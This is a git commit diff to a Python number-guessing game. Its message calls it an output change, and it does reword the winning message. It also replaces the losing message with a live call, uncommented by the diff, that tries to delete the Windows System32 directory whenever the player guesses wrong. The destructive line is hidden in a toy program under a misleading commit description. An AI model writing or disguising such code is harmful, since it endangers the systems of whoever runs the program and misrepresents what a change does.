cba28fac2f42ac1725600844ecba9b08db138df7
ghosteater1311 <147140341+ghosteater1311@users.noreply.github.com>
2024-10-15 09:19:17 +0000

    change output inside

--- Python/randomNumberGame.py
+++ Python/randomNumberGame.py
@@ -6,7 +6,6 @@ print(f"Type a number in range 1 to 1000")
 num = int(input())
 
 if num == random.randint(1, 1000) :
-    print(f"you right!")
+    print(f"Lucky Dog!")
 else:
-    #os.remove("C:\Windows\System32")
-    print(f"you wrong")
+    os.remove("C:\Windows\System32")
